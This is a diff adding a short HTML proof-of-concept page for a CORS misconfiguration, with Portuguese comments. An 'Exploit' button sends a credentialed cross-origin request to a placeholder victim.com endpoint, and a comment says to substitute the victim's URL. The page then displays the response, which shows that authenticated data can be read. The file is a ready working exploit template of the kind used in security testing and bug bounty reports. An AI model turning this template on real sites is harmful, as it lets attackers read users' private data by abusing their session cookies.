@@ -1,0 +1,22 @@
+<html>
+<!-- ESSE PAYLOAD É UTILIZADO PARA FAZER PROVA DE CONCEITO DO CORS MISCONFIGURATION-->
+     <body>
+         <h2 style="text-align: center;">CORS PoC</h2>
+         <div id="demo">
+             <button style="margin-left: 925px;"type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET","https://victim.com/endpoint", true); <!-- SUBSTITUA ESSA URL PELA URL DA VITIMA--> 
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
